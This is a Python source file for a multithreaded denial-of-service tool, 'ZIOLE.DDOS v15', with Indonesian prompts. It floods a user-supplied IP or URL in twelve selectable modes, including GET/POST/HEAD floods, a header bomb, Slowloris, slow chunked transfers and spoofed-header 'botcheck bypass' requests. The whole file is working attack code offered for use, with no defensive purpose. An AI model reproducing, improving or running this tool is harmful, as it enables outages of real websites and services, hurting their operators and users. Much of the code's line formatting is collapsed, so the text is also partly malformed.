
import os import sys import socket import time import random import threading import requests from urllib.parse import urlparse from colorama import Fore, Style

====== HELPER ======

def print_banner(): print(Fore.CYAN + """ ZIOLE.DDOS v15 FINAL

ALL-IN MODES ENABLED ⚔️🔥 """ + Style.RESET_ALL)

def ask_user_input(): target = input("Target (IP/URL): ").strip() print(""" Pilih Mode Serangan:

1. GET


2. POST


3. HEAD


4. MIX


5. RANGE


6. HEADER BOMB


7. CUSTOM JSON PAYLOAD


8. SOCKET RAW


9. SLOWLORIS


10. BYPASS BOTCHECK


11. RANDOM URL PATH


12. CHUNKED TRANSFER """) mode = input("Mode (1-12): ").strip() threads = int(input("Jumlah Thread: ")) duration = int(input("Durasi (detik): ")) return target, mode, threads, duration



def resolve_target(target): if target.startswith("http"): parsed = urlparse(target) host = parsed.hostname port = parsed.port or (443 if parsed.scheme == 'https' else 80) return target, host, port else: try: socket.inet_aton(target) return f"http://{target}", target, 80 except: raise Exception("IP target tidak valid!")

def random_headers(host): return { "User-Agent": random.choice([ "Mozilla/5.0", "Chrome/90.0", "Opera/9.80", "ZioleBot/1.0" ]), "Referer": f"http://{host}/", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}", "Accept-Encoding": "gzip, deflate", "Connection": "keep-alive" }

def base_threaded_attack(func): def wrapper(url, host, port, threads, duration): end = time.time() + duration def run(): while time.time() < end: try: func(url, host, port) except: pass for _ in range(threads): threading.Thread(target=run, daemon=True).start() while time.time() < end: time.sleep(1) return wrapper

====== ATTACK MODES ======

@base_threaded_attack def http_get(url, host, port): s = socket.create_connection((host, port), timeout=3) req = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n" s.send(req.encode()) s.close()

@base_threaded_attack def http_post(url, host, port): payload = "username=admin&password=123456" s = socket.create_connection((host, port), timeout=3) req = f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: {len(payload)}\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: close\r\n\r\n{payload}" s.send(req.encode()) s.close()

@base_threaded_attack def http_head(url, host, port): s = socket.create_connection((host, port), timeout=3) req = f"HEAD / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n" s.send(req.encode()) s.close()

@base_threaded_attack def http_mix(url, host, port): if random.randint(0,1): http_get(url, host, port) else: http_post(url, host, port)

@base_threaded_attack def http_range(url, host, port): s = socket.create_connection((host, port), timeout=3) req = f"GET / HTTP/1.1\r\nHost: {host}\r\nRange: bytes=0-999999\r\nConnection: close\r\n\r\n" s.send(req.encode()) s.close()

@base_threaded_attack def header_bomb(url, host, port): headers = ''.join([f"X-Fake-{i}: Ziole\r\n" for i in range(100)]) s = socket.create_connection((host, port), timeout=3) req = f"GET / HTTP/1.1\r\nHost: {host}\r\n{headers}Connection: close\r\n\r\n" s.send(req.encode()) s.close()

@base_threaded_attack def custom_json(url, host, port): requests.post(url, json={"user": "admin", "pass": "ZioleDDOS"})

@base_threaded_attack def socket_raw(url, host, port): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.send(b"ZIOLE PWNED THIS\n") s.close()

@base_threaded_attack def slowloris(url, host, port): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode()) for _ in range(100): s.send(f"X-a:{random.randint(1,9999)}\r\n".encode()) time.sleep(10)

@base_threaded_attack def bypass_botcheck(url, host, port): headers = random_headers(host) requests.get(url, headers=headers)

@base_threaded_attack def random_path(url, host, port): path = f"/login?rand={random.randint(1000,9999)}" s = socket.create_connection((host, port), timeout=3) req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n" s.send(req.encode()) s.close()

@base_threaded_attack def chunked_transfer(url, host, port): s = socket.create_connection((host, port), timeout=3) s.send(f"POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\n\r\n".encode()) for _ in range(10): chunk = f"{random.randint(10,20):X}\r\nZiole{random.randint(0,9)}\r\n" s.send(chunk.encode()) time.sleep(2) s.send(b"0\r\n\r\n") s.close()

====== MAIN ======

if name == "main": try: print_banner() target, mode, threads, duration = ask_user_input() url, host, port = resolve_target(target)

mode_map = {
        "1": http_get,
        "2": http_post,
        "3": http_head,
        "4": http_mix,
        "5": http_range,
        "6": header_bomb,
        "7": custom_json,
        "8": socket_raw,
        "9": slowloris,
        "10": bypass_botcheck,
        "11": random_path,
        "12": chunked_transfer
    }

    func = mode_map.get(mode)
    if func:
        func(url, host, port, threads, duration)
        print(f"\n[✓] Serangan ke {host}:{port} selesai!")
    else:
        print("[x] Mode tidak valid!")

except KeyboardInterrupt:
    print("\n[x] Dibatalkan user.")
except Exception as e:
    print(f"[x] ERROR: {e}")

